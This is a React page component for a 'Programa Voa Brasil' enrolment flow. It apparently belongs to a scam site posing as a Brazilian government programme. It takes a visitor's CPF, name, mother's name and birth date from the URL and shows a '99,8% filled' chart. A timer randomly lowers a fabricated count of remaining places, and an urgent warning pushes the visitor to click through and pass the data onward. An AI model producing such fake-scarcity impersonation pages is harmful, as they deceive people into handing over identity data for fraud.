import { useLocation } from "wouter";
import { PieChart, Pie, Cell, ResponsiveContainer } from "recharts";
import { useEffect, useState } from "react";
import Header from "../components/Header";

interface UserData {
  cpf: string;
  nome: string;
  nome_mae: string;
  data_nascimento: string;
  sexo: string;
}

function capitalizeFirstLetter(str: string): string {
  return str.toLowerCase().split(' ')
    .map(word => word.charAt(0).toUpperCase() + word.slice(1).toLowerCase())
    .join(' ');
}

export default function Success() {
  const [, setLocation] = useLocation();
  const searchParams = new URLSearchParams(window.location.search);
  const encodedData = searchParams.get('data');
  const [remainingSlots, setRemainingSlots] = useState(6906);

  let userData: UserData | null = null;
  try {
    if (encodedData) {
      userData = JSON.parse(decodeURIComponent(encodedData));
    }
  } catch (error) {
    console.error('Error parsing user data:', error);
  }

  useEffect(() => {
    const interval = setInterval(() => {
      setRemainingSlots(prev => {
        const decrease = Math.floor(Math.random() * 2) + 1;
        return Math.max(0, prev - decrease);
      });
    }, Math.floor(Math.random() * 2000) + 1000);

    return () => clearInterval(interval);
  }, []);

  const totalVagas = 3452750;
  const vagasPreenchidas = totalVagas - remainingSlots;
  const vagasDisponiveis = remainingSlots;

  const data = [
    { name: 'Vagas Preenchidas', value: vagasPreenchidas },
    { name: 'Vagas Disponíveis', value: vagasDisponiveis },
  ];

  const COLORS = ['#1351B4', '#E6ECF5'];

  const handleClick = () => {
    setLocation(`/verify-availability?data=${encodedData}`);
  };

  return (
    <div>
      <Header />

      <div className="container">
        <main id="main-signin" style={{ width: '100%', maxWidth: '800px', margin: '0 auto' }}>
          <div className="card" style={{ width: '100%', alignItems: 'flex-start', padding: '2rem' }}>
            <div className="w-full">
              <div className="text-center mb-8">
                <h2 className="text-2xl font-bold mb-2">
                  Olá, {userData ? capitalizeFirstLetter(userData.nome.split(' ')[0]) : ''}!
                </h2>
                <p className="text-gray-600">Bem-vindo ao Programa Voa Brasil</p>
              </div>

              <div className="bg-gray-50 p-6 rounded-lg mb-8">
                <h3 className="text-xl font-semibold mb-4 text-center">99,8% das vagas Preenchidas</h3>
                <div className="h-[200px] w-full mb-4">
                  <ResponsiveContainer width="100%" height="100%">
                    <PieChart>
                      <Pie
                        data={data}
                        cx="50%"
                        cy="50%"
                        labelLine={false}
                        outerRadius={80}
                        fill="#8884d8"
                        dataKey="value"
                      >
                        {data.map((entry, index) => (
                          <Cell key={`cell-${index}`} fill={COLORS[index % COLORS.length]} />
                        ))}
                      </Pie>
                    </PieChart>
                  </ResponsiveContainer>
                </div>
                <div className="text-center mb-6">
                  <p className="text-sm text-gray-600 mb-2">Total de vagas: {totalVagas.toLocaleString('pt-BR')}</p>
                  <div className="flex justify-center gap-8">
                    <div className="flex items-center">
                      <div className="w-3 h-3 rounded-full bg-[#1351B4] mr-2"></div>
                      <span className="text-sm">Preenchidas: {vagasPreenchidas.toLocaleString('pt-BR')}</span>
                    </div>
                    <div className="flex items-center">
                      <div className="w-3 h-3 rounded-full bg-[#E6ECF5] mr-2"></div>
                      <span className="text-sm">Disponíveis: {vagasDisponiveis.toLocaleString('pt-BR')}</span>
                    </div>
                  </div>
                </div>
              </div>

              <div className="flex justify-center mb-8">
                <button
                  className="button-continuar bg-[#1351B4] text-white px-6 py-3 rounded-md font-medium hover:bg-[#1351B4]/90 transition-colors"
                  onClick={handleClick}
                >
                  Me Inscrever Agora
                </button>
              </div>

              <div className="bg-yellow-50 p-6 rounded-lg mb-8">
                <h4 className="text-lg font-semibold mb-2 text-yellow-800">Atenção!</h4>
                <p className="text-yellow-800 mb-4">
                  Restam apenas {vagasDisponiveis.toLocaleString('pt-BR')} vagas disponíveis no Programa Voa Brasil. 
                  Não perca a oportunidade de garantir sua participação!
                </p>
                <p className="text-yellow-700">
                  Tem interesse em se inscrever no programa? Verifique agora mesmo a disponibilidade de vagas na sua região.
                </p>
              </div>
            </div>
          </div>
        </main>
      </div>
    </div>
  );
}